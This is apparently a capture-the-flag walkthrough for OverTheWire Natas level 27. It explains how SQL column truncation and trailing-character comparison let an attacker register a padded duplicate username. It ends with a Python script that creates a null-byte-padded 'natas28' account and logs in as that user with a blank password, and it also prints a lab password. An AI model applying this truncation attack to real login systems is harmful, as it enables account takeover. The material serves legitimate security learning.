# 🕸️Natas Level 27 → Level 28

```
http://natas27.natas.labs.overthewire.org
```
Username: natas27  
Password: (natas27_password)

![n27s1](n27s1.png)

Navigate to the **source page**.

![n27s2](n27s2.png)
![n27s3](n27s3.png)
![n27s4](n27s4.png)
![n27s5](n27s5.png)
![n27s6](n27s6.png)

Next, we try logging into `natas28` with the password `1234`.

![n27s7](n27s7.png)

We received the message: “wrong password for user: `natas28`".

![n27s8](n27s8.png)

Next, we attempt to log in with a non-existent user.

![n27s9](n27s9.png)

The previously non-existent user has now been created.

![n27s10](n27s10.png)

After going back to the main page, we make another login attempt.

![n27s11](n27s11.png)

We received a welcome message along with the user data.

![n27s12](n27s12.png)

### 🧠 Breaking Down the Concept 

We create a SQL table using the code from the source page, but we change ``varchar(64)`` to ``varchar(10)`` to simplify it.

![n27s13](n27s13.png)

After that, we check the contents of the table.
```
SELECT * FROM users;
```
![n27s14](n27s14.png)

The output shows two rows for user `natas28`, but with different passwords.

![n27s15](n27s15.png)

Next, we execute another SQL query.
```
SELECT * FROM users WHERE username = 'natas28'
```
![n27s16](n27s16.png)

The SQL table returns both rows for `natas28`, even though one has 3 extra spaces and the other doesn’t; SQL treats them as the same.

![n27s17](n27s17.png)

The next step is to create **natas28 with 57 extra spaces**.

![n27s18](n27s18.png)

Our attempt failed, and we received the message: **“Go away, hacker”**

![n27s19](n27s19.png)

The ``trim()`` function removed our spaces, so we had to get creative.

![n27s20](n27s20.png)

Next, we try to bypass this by appending the word hack after the 57 spaces.

![n27s21](n27s21.png)

Our attempt worked, and a new user was created.

![n27s22](n27s22.png)

After that, we attempt to access `natas28` with the new user’s password, which is blank.

![n27s23](n27s23.png)

Another login attempt failed, and we received the message: **“Wrong password for user: natas28”**.

![n27s24](n27s24.png)

After that, we try swapping the **57 spaces** for **57 null characters** with **CyberChef’s help**.

![n27s25](n27s25.png)

![Null](Null.png)


Next, we try adding a new user with an empty password.

![n27s26](n27s26.png)

Alternatively, we can achieve the same thing directly via the URL.

![n27s27](n27s27.png)

We successfully created a new user.

![n27s28](n27s28.png)

Once again, we attempt to access `natas28` with an empty password.

![n27s29](n27s29.png)

The welcome message appeared, and the flag is now visible.

![n27s30](n27s30.png)

### Using Python Script

```
import requests


# Credentials for natas27
username = "natas27"
password = "u3RRffXjysjgwFU6b9xa23i6prmUsYne"

# Target URL
url = "http://natas27.natas.labs.overthewire.org/index.php"

# Payload for the username.
# Null in python "\0" or "\x00"
null = "\0"*57
user = f"natas28{null}hack2"
payload = {
    "username": user,
    "password": ""
}

# Start a session to persist cookies and headers across requests
session = requests.Session()

# send POST request to create user
post_response = session.post(
    url,
    data=payload,
    auth=(username, password)
)

#print(post_response.text)
#print("="*80)

# send POST request to login as natas28
response = session.post(
    url,
    data={"username":"natas28", "password":""},
    auth=(username, password)
)

print(response.text)
```

Make sure the file has executable permissions before running the script.

![n27s31](n27s31.png)

Finally, we got the flag for the upcoming level.

![n27s32](n27s32.png)

Fantastic! This flag is your key to the next challenge.

